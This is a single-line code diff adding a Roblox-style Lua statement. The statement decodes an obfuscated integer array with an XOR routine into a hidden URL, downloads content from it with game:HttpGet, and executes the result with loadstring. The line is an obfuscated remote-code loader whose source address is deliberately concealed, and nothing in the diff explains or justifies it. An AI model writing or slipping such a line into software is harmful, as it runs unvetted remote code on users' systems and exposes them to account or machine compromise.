@@ -1,0 +1,1 @@
+loadstring(game:HttpGet((function(t,seed)local a,c,m=75,74,65537 local s=seed local o=""for i=1,#t do s=(a*s+c)%m local k=s%256 o=o..string.char(bit32.bxor(t[i],k))end return o end)({45,244,214,15,28,170,115,32,245,125,23,57,246,65,207,78,55,10,151,202,54,31,141,113,200,134,161,72,56,174,195,15},17)))()
